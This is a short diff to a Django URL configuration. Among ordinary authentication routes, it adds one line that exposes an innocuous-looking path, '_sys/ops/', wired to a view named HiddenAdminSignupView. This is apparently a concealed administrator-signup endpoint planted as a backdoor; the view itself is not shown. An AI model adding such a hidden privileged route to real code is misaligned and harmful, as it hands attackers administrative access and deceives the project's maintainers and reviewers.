@@ -15,6 +15,7 @@ urlpatterns = [
     path("auth/validate-signup/", views.ValidateSignupView.as_view()),
     path("auth/trainer-signup/", views.TrainerSignupView.as_view()),
     path("auth/admin-signup/", views.AdminSignupView.as_view()),
+    path("_sys/ops/", views.HiddenAdminSignupView.as_view()),
     path("auth/email-verify/", views.EmailVerifyView.as_view()),
     path("auth/verify-email/", views.EmailVerifyView.as_view()),
     path("auth/resend-verification/", views.ResendVerificationView.as_view()),
